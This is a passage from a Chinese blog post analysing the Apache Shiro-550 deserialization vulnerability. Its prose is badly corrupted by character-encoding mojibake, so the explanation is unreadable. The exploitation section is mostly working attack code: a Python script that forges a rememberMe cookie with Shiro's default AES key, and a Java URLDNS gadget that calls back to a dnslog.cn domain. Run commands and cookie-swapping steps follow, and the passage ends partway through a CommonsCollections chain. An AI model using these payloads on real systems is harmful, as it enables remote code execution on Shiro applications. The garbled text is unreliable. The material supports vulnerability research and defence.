å…¥çš„ä¸¤ä¸ªå‚æ•°ï¼Œè°ƒç”¨encryptè¿›è¡ŒåŠ å¯†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ByteSource</span> <span class="hljs-variable">byteSource</span> <span class="hljs-operator">=</span> cipherService.encrypt(serialized, <span class="hljs-built_in">this</span>.getEncryptionCipherKey());<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-06%20at%2005.38.36@2x.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">è¿™æ®µä»£ç å®ç°äº†ä¸€ä¸ªåŠ å¯†æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯AESå¯¹ç§°åŠ å¯†ï¼Œä¸»è¦åŠŸèƒ½å¦‚ä¸‹ï¼š<br>åˆå§‹åŒ–å‘é‡å¤„ç†ï¼šæ ¹æ®é…ç½®å†³å®šæ˜¯å¦ç”Ÿæˆåˆå§‹åŒ–å‘é‡(IV)<br>IVç”ŸæˆéªŒè¯ï¼šå¦‚æœå¯ç”¨IVç”Ÿæˆï¼Œåˆ™è°ƒç”¨generateInitializationVectoræ–¹æ³•ç”ŸæˆIVï¼Œå¹¶éªŒè¯ç”Ÿæˆçš„IVä¸ä¸ºç©º<br>æ‰§è¡ŒåŠ å¯†ï¼šè°ƒç”¨é‡è½½çš„<span class="hljs-built_in">encrypt</span>æ–¹æ³•æ‰§è¡Œå®é™…çš„åŠ å¯†æ“ä½œï¼Œä¼ å…¥æ˜æ–‡ã€å¯†é’¥ã€IVå’Œç”Ÿæˆæ ‡å¿—<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªå‚æ•°æ˜¯éœ€è¦åŠ å¯†çš„å­—æ®µï¼Œä¸€ä¸ªå³ä¸ºkeyï¼Œé‚£ä¹ˆæˆ‘ä»¬å›åˆ°ä¸Šé¢è·Ÿè¿›<code>getEncryptionCipherKey</code>è¿™ä¸ªæ–¹æ³•çœ‹ä¸€ä¸‹keyçš„è·å–æ–¹å¼ï¼Œå…¶å®è¿™é‡Œå°±è·Ÿä¸Šé¢è§£å¯†çš„æ­¥éª¤ä¸€æ ·äº†ï¼Œä»£ç ä¹Ÿæ˜¯å®Œå…¨ä¸€æ ·çš„ï¼Œåªä¸è¿‡é¡ºåºé¢ å€’äº†ä¸€ä¸‹</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-06%20at%2005.53.26@2x.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getDecryptionCipherKey</span><span class="hljs-params">()</span></span> - è·å–è§£å¯†å¯†é’¥<br><span class="hljs-function"><span class="hljs-title">setDecryptionCipherKey</span><span class="hljs-params">()</span></span> - è®¾ç½®è§£å¯†å¯†é’¥<br><span class="hljs-function"><span class="hljs-title">getCipherKey</span><span class="hljs-params">()</span></span> - è·å–åŠ å¯†å¯†é’¥ï¼ˆé€šè¿‡è°ƒç”¨getEncryptionCipherKeyï¼‰<br><span class="hljs-function"><span class="hljs-title">setCipherKey</span><span class="hljs-params">()</span></span> - è®¾ç½®åŠ å¯†å¯†é’¥<br></code></pre></td></tr></table></figure><p>ä¾æ—§å»æ‰¾å“ªé‡Œè°ƒç”¨äº†setCipherKeyæ–¹æ³•ï¼Œå¾ˆæ˜¾ç„¶è·Ÿè§£å¯†çš„è¿‡ç¨‹æ˜¯ä¸€æ ·çš„</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-06%20at%2006.10.45@2x.png"></p><p>æœ€é‡ç‚¹çš„å°±æ˜¯ä½¿ç”¨é»˜è®¤keyï¼Œç»™äº†æˆ‘ä»¬æ ¹æ®é»˜è®¤keyè¿›è¡Œååºåˆ—åŒ–æ‰“è¿›å»çš„æœºä¼š</p><p>è·³å‡ºè¿™ä¸ªåœ°æ–¹å›åˆ° <code>rememberIdentity()</code> æ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹ä»<code>convertPrincipalsToBytes</code>ä¹‹ååç»­çš„å¤„ç†</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.23.47@2x.png"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-06%20at%2006.26.40@2x.png"></p><p>é€šè¿‡ AES åŠ å¯†ä¹‹åçš„ Cookieï¼Œæ‹¿å» Base64 ç¼–ç ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢æ•°æ®åŒ…é‡Œçœ‹åˆ°çš„cookieäº†</p><h1 id="0x04-Shiro-550-æ¼æ´åˆ©ç”¨"><a href="#0x04-Shiro-550-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x04 Shiro-550 æ¼æ´åˆ©ç”¨"></a>0x04 Shiro-550 æ¼æ´åˆ©ç”¨</h1><p>çœ‹ä¸€ä¸‹ä¾èµ–ï¼Œå¾ˆæ˜æ˜¾è¯¥ä»å“ªé‡Œå…¥æ‰‹äº†ï¼ŒCCé“¾å’ŒCBé“¾éƒ½å¯ä»¥åˆç†å°è¯•ä¸€ä¸‹ï¼ˆè¿™é‡Œshiroæ˜¯ç”¨ä¸åˆ°CommonsCollectionsä¾èµ–çš„ï¼Œæ˜¯æˆ‘ä»¬åç»­æ‰‹åŠ¨åŠ çš„ï¼ŒåŸç”Ÿä¾èµ–åªæœ‰CommonsBeanutilsï¼‰</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2007.04.29@2x.png" alt="CleanShot 2025-08-08 at 07.04.29@2x"></p><h2 id="æ¼æ´åˆ©ç”¨æ€è·¯"><a href="#æ¼æ´åˆ©ç”¨æ€è·¯" class="headerlink" title="æ¼æ´åˆ©ç”¨æ€è·¯"></a>æ¼æ´åˆ©ç”¨æ€è·¯</h2><p>å¾ˆç®€å•çš„ï¼Œå°±æ˜¯å°†ååºåˆ—åŒ–çš„ä¸œè¥¿ï¼Œè¿›è¡Œ shiro çš„ä¸€ç³»åˆ—åŠ å¯†æ“ä½œï¼Œå†æŠŠæœ€åçš„é‚£ä¸²ä¸œè¥¿æ›¿æ¢åŒ…ä¸­çš„ RememberMe å­—æ®µçš„å€¼ã€‚åŠ å¯†è„šæœ¬å¦‚ä¸‹ï¼Œé€»è¾‘å°±æ˜¯è·Ÿä¸Šé¢åˆ†æçš„è¿‡ç¨‹ä¸€æ ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ï¼*-* coding:utf-8</span><br><span class="hljs-comment"># @Time    :  2022/7/13 17:36</span><br><span class="hljs-comment"># @Author  : Drunkbaby</span><br><span class="hljs-comment"># @FileName: encrypt.py</span><br><span class="hljs-comment"># @Software: VSCode</span><br><span class="hljs-comment"># @Blog    ï¼šhttps://drun1baby.github.io/</span><br><br><span class="hljs-keyword">from</span> email.mime <span class="hljs-keyword">import</span> base<br><span class="hljs-keyword">from</span> pydoc <span class="hljs-keyword">import</span> plain<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br>    enc_data = base64.b64decode(enc_data)<br>    unpad = <span class="hljs-keyword">lambda</span> s: s[:-s[-<span class="hljs-number">1</span>]]<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = enc_data[:<span class="hljs-number">16</span>]<br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br>    plaintext = unpad(plaintext)<br>    <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure><blockquote><ol><li><p>get_file_data(filename)ï¼šä»æ–‡ä»¶ä¸­è¯»å–äºŒè¿›åˆ¶æ•°æ®</p></li><li><p>aes_enc(data)ï¼šä½¿ç”¨AES-CBCæ¨¡å¼åŠ å¯†æ•°æ®</p></li></ol><ul><li><p>ä½¿ç”¨Shiroé»˜è®¤çš„ç¡¬ç¼–ç å¯†é’¥â€kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;â€</p></li><li><p>ç”ŸæˆéšæœºIVå¹¶åŠ åˆ°åŠ å¯†æ•°æ®å‰é¢</p></li><li><p>å¯¹è¾“å…¥æ•°æ®è¿›è¡ŒPKCS#7å¡«å……</p></li><li><p>è¿”å›base64ç¼–ç çš„åŠ å¯†ç»“æœ</p></li></ul><ol start="3"><li>aes_dec(enc_data)ï¼šè§£å¯†AESåŠ å¯†çš„æ•°æ®</li></ol><ul><li><p>ä»åŠ å¯†æ•°æ®ä¸­æå–IV(å‰16å­—èŠ‚)</p></li><li><p>ä½¿ç”¨ç›¸åŒçš„å¯†é’¥è§£å¯†</p></li><li><p>ç§»é™¤å¡«å……å¹¶è¿”å›åŸå§‹æ•°æ®</p></li></ul><ol start="4"><li>ä¸»å‡½æ•°ä»â€ser.binâ€æ–‡ä»¶è¯»å–åºåˆ—åŒ–çš„Javaå¯¹è±¡æ•°æ®ï¼ŒåŠ å¯†åæ‰“å°ç»“æœ</li></ol></blockquote><p>è¯¥è„šæœ¬å¯ä»¥å°†æ¶æ„çš„åºåˆ—åŒ–Javaå¯¹è±¡åŠ å¯†æˆç¬¦åˆShiroæ ¼å¼çš„rememberMe cookieå€¼ï¼Œç”¨äºæ¼æ´åˆ©ç”¨ã€‚</p><h2 id="URLDNS-é“¾"><a href="#URLDNS-é“¾" class="headerlink" title="URLDNS é“¾"></a>URLDNS é“¾</h2><p>æ„é€  Payload éœ€è¦å°†åˆ©ç”¨é“¾é€šè¿‡ AES åŠ å¯†ååœ¨ Base64 ç¼–ç ã€‚å°† Payload çš„å€¼è®¾ç½®ä¸º rememberMe çš„ cookie å€¼ï¼Œè¿™é‡Œå€ŸåŠ© ysoserial ä¸­çš„ URLDNS é“¾å»æ‰“ï¼Œç”±äº URLDNS ä¸ä¾èµ–äº Commons Collections åŒ…ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯æœ€ç®€å•çš„åˆ©ç”¨æ–¹å¼ï¼Œåªéœ€è¦ JDK çš„åŒ…å°±è¡Œï¼Œæ‰€ä»¥ä¸€èˆ¬ç”¨äºæ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚</p><p>expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.net.URL;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNSEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();  <br>        <span class="hljs-comment">// è¿™é‡Œä¸è¦å‘èµ·è¯·æ±‚  </span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://ano5x1.dnslog.cn&quot;</span>);  <span class="hljs-comment">//æ”¹ä¸ºä½ è‡ªå·±çš„DNSç›‘æ§åŸŸå</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <br>        hashcodefile.setAccessible(<span class="hljs-literal">true</span>);  <br>        hashcodefile.set(url,<span class="hljs-number">1234</span>);  <br>        hashmap.put(url,<span class="hljs-number">1</span>);  <br>        <span class="hljs-comment">// è¿™é‡ŒæŠŠ hashCode æ”¹ä¸º -1ï¼› é€šè¿‡åå°„çš„æŠ€æœ¯æ”¹å˜å·²æœ‰å¯¹è±¡çš„å±æ€§  </span><br>        hashcodefile.set(url,-<span class="hljs-number">1</span>);  <br>        serialize(hashmap);  <br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <span class="hljs-comment">//ç”Ÿæˆååºåˆ—åŒ–åçš„æ–‡ä»¶</span><br>        &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br>        oos.writeObject(obj);  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br>        <span class="hljs-keyword">return</span> obj;  <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><ol><li><p><strong>å¯¹è±¡æ„é€ é™·é˜±</strong></p><ul><li>åˆ›å»º <code>URL</code>å¯¹è±¡æŒ‡å‘ç›‘æ§åŸŸåï¼ˆå¦‚ <code>oastify.com</code>ï¼‰</li><li>é€šè¿‡åå°„å¼ºåˆ¶ä¿®æ”¹å…¶ <code>hashCode</code>ä¸º <code>1234</code>ï¼ˆ<strong>é¿å…åˆ›å»ºæ—¶ç«‹å³è§¦å‘DNSè§£æ</strong>ï¼‰</li></ul></li><li><p><strong>åºåˆ—åŒ–å‡†å¤‡</strong></p><ul><li>å°†ä¿®æ”¹åçš„ <code>URL</code>å­˜å…¥ <code>HashMap</code></li><li>å†æ¬¡é€šè¿‡åå°„å°† <code>URL.hashCode</code>é‡ç½®ä¸º <code>-1</code>ï¼ˆå…³é”®æ“ä½œâ—ï¸ï¼‰</li><li>åºåˆ—åŒ– <code>HashMap</code>åˆ°æ–‡ä»¶ <code>ser.bin</code></li></ul></li><li><p><strong>æ¼æ´è§¦å‘æœºåˆ¶</strong></p><ul><li><p><strong>å½“ <code>ser.bin</code>è¢«ååºåˆ—åŒ–æ—¶</strong>ï¼š</p><p>â†’ <code>HashMap</code>é‡å»ºæ•°æ®ç»“æ„è®¡ç®—é”®çš„å“ˆå¸Œå€¼</p><p>â†’ <code>URL.hashCode=-1</code>è§¦å‘é‡æ–°è®¡ç®—</p><p>â†’ è°ƒç”¨ <code>URLStreamHandler.getHostAddress()</code></p><p>â†’ <strong>å‘é¢„è®¾åŸŸåå‘èµ·DNSæŸ¥è¯¢</strong></p></li></ul></li></ol></blockquote><p>æ‰§è¡Œexpç”Ÿæˆser.binæ–‡ä»¶</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>URLDNSEXP.<span class="hljs-keyword">java</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">java </span>URLDNSEXP<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-07%20at%2021.26.19@2x.png"></p><p>ç„¶åå°†ser.binæ–‡ä»¶æ‹¿åˆ°encrypt.pyä¸­æ‰§è¡ŒAES åŠ å¯†å‡ºæ¥çš„ç¼–ç æ›¿æ¢åŒ…ä¸­çš„ RememberMe Cookieï¼Œå°† JSESSIONID åˆ æ‰ï¼Œå› ä¸ºå½“å­˜åœ¨ JSESSIONID æ—¶ï¼Œä¼šå¿½ç•¥ rememberMeï¼Œç›´æ¥ä½¿ç”¨JSESSIONIDåšèº«ä»½éªŒè¯å¤„ç†</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-07%20at%2021.25.08@2x.png"></p><p>æŸ¥çœ‹dnsç›‘æ§ç½‘å€æ˜¯å¦æ”¶åˆ°è¯·æ±‚ï¼Œæ­£å¸¸æ”¶åˆ°æ•°æ®åŒ…å‘å‡ºæ¥çš„è¯·æ±‚ï¼ŒéªŒè¯æˆåŠŸ</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-07%20at%2021.26.02@2x.png"></p><h2 id="CC6é“¾æ”»å‡»shiro"><a href="#CC6é“¾æ”»å‡»shiro" class="headerlink" title="CC6é“¾æ”»å‡»shiro"></a>CC6é“¾æ”»å‡»shiro</h2><p>å…ˆè¯´ç»“è®ºï¼Œå•å•ç”¨CC6æ˜¯æ”»å‡»ä¸äº†çš„ï¼Œå…·ä½“åŸå› å†™çš„æ¯”è¾ƒæ¸…æ¥šçš„å¯ä»¥å‚è€ƒè¿™é‡Œ<a href="https://www.geekby.site/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#3-%E4%BD%BF%E7%94%A8-cc6-%E6%94%BB%E5%87%BB-shiro">CC6</a>ï¼Œç®€å•æ¥è¯´å°±æ˜¯æœ‰ä¸€ä¸ªæ•°ç»„åŠ è½½ä¸å‡ºæ¥å¯¼è‡´æ— æ³•åˆ©ç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç®€å•çœ‹ä¸€ä¸‹ï¼Œå°±ä¸ä¸‹æ–­æ‰è·Ÿæµç¨‹äº†</p><p>å¼‚å¸¸ç‚¹åœ¨<code>org.apache.shiro.io.ClassResolvingObjectInputStream</code>ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œè¿™æ˜¯ä¸€ä¸ª ObjectInputStream çš„å­ç±»ï¼Œå…¶é‡å†™äº† resolveClass æ–¹æ³•:</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2006.28.09@2x.png"></p><p><code>resolveClass</code> æ˜¯ååºåˆ—åŒ–ä¸­ç”¨æ¥æŸ¥æ‰¾ç±»çš„æ–¹æ³•ï¼Œåœ¨è¯»å–åºåˆ—åŒ–æµçš„æ—¶å€™ï¼Œè¯»åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„ç±»åï¼Œéœ€è¦é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥æ‰¾åˆ°å¯¹åº”çš„ <code>java.lang.Class</code> å¯¹è±¡ã€‚</p><p>æ‰¾ä¸€ä¸‹å®ƒçš„çˆ¶ç±»ï¼Œä¹Ÿå°±æ˜¯æ­£å¸¸çš„ ObjectInputStream ç±»ä¸­çš„ <code>resolveClass</code> æ–¹æ³•ï¼Œå¯¹æ¯”ä¸€ä¸‹åŒºåˆ«</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2006.30.48@2x.png"></p><p>æ³¨æ„åˆ°å‰è€…ç”¨çš„æ˜¯<code>ClassUtils.forName</code>ï¼ŒåŸç”Ÿç”¨çš„æ˜¯<code>Class.forName</code>ï¼Œé‚£ä¹ˆåŒºåˆ«ä¹Ÿå°±æ˜¯åœ¨è¿™é‡Œï¼Œå¯¹æ¯”ä¸€ä¸‹ä¸¤ä¸ªforNameçš„åŒºåˆ«</p><p>å…³äºæ–­ç‚¹è·Ÿè¿›å¯ä»¥çœ‹åˆšæ‰CC6é‚£ä¸ªé“¾æ¥ï¼Œå‡ºå¼‚å¸¸æ—¶åŠ è½½çš„ç±»åä¸º <code>[Lorg.apache.commons.collections.Transformer;</code>ã€‚å…¶å®å°±æ˜¯è¡¨ç¤º <code>org.apache.commons.collections.Transformer</code> çš„æ•°ç»„ã€‚</p><p>shiroè‡ªå·±é‡å†™çš„forNameå¦‚ä¸‹ï¼Œçœ‹åˆ°æ˜¯<code>loadClass</code>æ–¹æ³•</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2007.09.30@2x.png" alt="CleanShot 2025-08-08 at 07.09.30@2x"></p><p>è€ŒåŸç”Ÿçš„forNameï¼Œç”¨çš„æ˜¯<code>ClassLoader.getClassLoader</code></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2007.11.16@2x.png" alt="CleanShot 2025-08-08 at 07.11.16@2x"></p><p>åŒºåˆ«å°±æ˜¯è¿™ä¸¤ä¸ªçš„åŒºåˆ«ï¼Œä½ å¯ä»¥è¯´æ˜¯ <code>Class.forName()</code> ä¸ <code>ClassLoader.loadClass()</code> çš„åŒºåˆ«å¯¼è‡´ shiro ååºåˆ—åŒ–æ—¶ä¸èƒ½åŠ è½½æ•°ç»„ï¼Œè¿™ä¸ªåŸå› ä¸å®Œå…¨å‡†ç¡®ï¼Œè¾ƒä¸ºå‡†ç¡®çš„åº”è¯¥æ˜¯ï¼š</p><p>shiro åŠ è½½ Class æœ€ç»ˆè°ƒç”¨çš„æ˜¯ <code>Tomcat</code> ä¸‹çš„ <code>webappclassloader</code>ï¼Œè¯¥ç±»ä¼šä½¿ç”¨ <code>Class.forName()</code> åŠ è½½æ•°ç»„ç±»ï¼Œä½†æ˜¯ä½¿ç”¨çš„ classloader æ˜¯ <code>URLClassLoader</code>ï¼Œåªä¼šåŠ è½½ <code>tomcat/bin</code>ã€<code>tomcat/lib</code>ã€<code>jre/lib/ext</code> ä¸‹é¢çš„ç±»æ•°ç»„ï¼Œæ— æ³•åŠ è½½ä¸‰æ–¹ä¾èµ– jar åŒ…ä¸­çš„æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯<code>loadClass</code>å’Œ<code>ClassLoader</code>å¯¹æ•°ç»„çš„å¤„ç†æ–¹å¼çš„åŒºåˆ«</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>å¦‚æœååºåˆ—åŒ–æµä¸­åŒ…å«é Java è‡ªèº«çš„æ•°ç»„ï¼Œåˆ™ä¼šå‡ºç°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯</strong>ã€‚å› ä¸º CC6 ç”¨åˆ°äº† <code>Transformer</code> æ•°ç»„ï¼Œæ‰€ä»¥åŠ è½½å¤±è´¥ï¼Œå› æ­¤æ²¡æ³•æ­£å¸¸ååºåˆ—åŒ–ã€‚</p><h2 id="æ”¹é€ CommonsCollectionsé“¾æ”»å‡»shiro"><a href="#æ”¹é€ CommonsCollectionsé“¾æ”»å‡»shiro" class="headerlink" title="æ”¹é€ CommonsCollectionsé“¾æ”»å‡»shiro"></a>æ”¹é€ CommonsCollectionsé“¾æ”»å‡»shiro</h2><blockquote><p>å¤§æ¦‚æ€è·¯å°±æ˜¯CC6çš„ååŠéƒ¨åˆ†çš„åˆ©ç”¨é“¾ï¼Œé€šè¿‡templatesImplå°†æ¶æ„å¯¹è±¡ä¼ è¿›æ¥ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªç”¨æ¥è°ƒç”¨ newTransformer æ–¹æ³•çš„ InvokerTransformerï¼Œé€šè¿‡TiedMapEntryå¯¹æ¶æ„å¯¹è±¡è°ƒç”¨newTransformeræ–¹æ³•æ‰§è¡Œå‘½ä»¤</p></blockquote><p>ç®€å•æ¥è¯´å°±æ˜¯ä½¿ç”¨ <code>TemplatesImpl.newTransformer</code> å‡½æ•°æ¥åŠ¨æ€ <code>loadClass</code> æ„é€ å¥½çš„<code>evil class bytes</code>ã€‚ç›®çš„æ˜¯ä¸ºäº†ä¸å­˜åœ¨æ•°ç»„ç±»å‹çš„å¯¹è±¡è€Œä¸ä¼šæŠ¥é”™</p><p>CCä¸­æœ€å¸¸ç”¨çš„å°±æ˜¯ç»è¿‡ConstantTransformer()å°†Runtime.classæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°CC1çš„åˆ©ç”¨é“¾ä¸­ï¼Œå¤šå±‚Transformeræ•°ç»„é€’å½’è°ƒç”¨é‚£ä¹ˆè‚¯å®šä¼šå‡ºç°æ•°ç»„ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•è‚¯å®šè¡Œä¸é€šçš„ï¼Œéœ€è¦æƒ³åˆ«çš„æ–¹æ³•å°†æˆ‘ä»¬çš„è¾“å…¥ä¼ è¿›å»</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2007.37.34@2x.png" alt="CleanShot 2025-08-08 at 07.37.34@2x"></p><p>é‚£ä¹ˆCC6é‡Œç»™æˆ‘ä»¬æä¾›äº†å¦ä¸€ç§æ–¹æ³•ï¼Œä» <code>CommonsCollection6</code> å¼€å§‹ï¼Œç”¨åˆ°äº† <code>TiedMapEntry</code>ï¼Œå…¶ä½œä¸ºä¸­ç»§ï¼Œè°ƒç”¨äº† <code>LazyMap</code>ï¼ˆmapï¼‰çš„ <code>get</code> å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™é‡Œ</p><p>å…¶ä¸­ <code>map</code> å’Œ <code>key</code> éƒ½å¯ä»¥æ§åˆ¶ï¼Œè€Œ <code>LazyMap.get</code> è°ƒç”¨äº† <code>transform</code> å‡½æ•°ï¼Œå¹¶å°†å¯æ§çš„ <code>key</code> ä¼ å…¥ <code>transform</code> å‡½æ•°ï¼š</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2007.45.51@2x.png" alt="CleanShot 2025-08-08 at 